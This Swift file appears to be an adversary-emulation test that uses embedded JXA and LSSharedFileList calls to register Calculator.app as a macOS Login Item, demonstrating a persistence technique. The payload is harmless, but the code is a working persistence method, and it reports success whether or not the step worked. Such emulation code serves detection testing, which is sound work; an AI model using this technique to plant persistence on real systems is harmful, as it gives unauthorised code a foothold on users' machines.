import Foundation
import Cocoa
import OSAKit

print("This TTP will create Login Item persistence to open Calc")

var retString = ""
    print(" ===> Attempting to create Login Item persistence to open calc")

    do {

	let jxa =
        """
        ObjC.import('CoreServices');
        ObjC.import('Security');
        ObjC.import('SystemConfiguration');
        let temp = $.CFURLCreateFromFileSystemRepresentation($.kCFAllocatorDefault, "/System/Applications/Calculator.app", "/System/Applications/Calculator.app".length, false);
        //let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListGlobalLoginItems, $.nil);
        let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListSessionLoginItems, $.nil);
        let cfName = $.CFStringCreateWithCString($.nil, "Calculator.app", $.kCFStringEncodingASCII);
        let itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);
        console.log("[+] Calculator.app successfully added as a Login Item");
        """

        let script = OSAScript.init(source: jxa, language: OSALanguage.init(forName: "JavaScript"))
        var compileErr : NSDictionary?
        script.executeAndReturnError(&compileErr)
        var scriptErr : NSDictionary?
        script.executeAndReturnError(&scriptErr)

        retString = "[+] Calculator.app successfully added as a Login Item"


    } catch let error {
        retString = "[-] Error: \(error)"
    }

    print(retString)




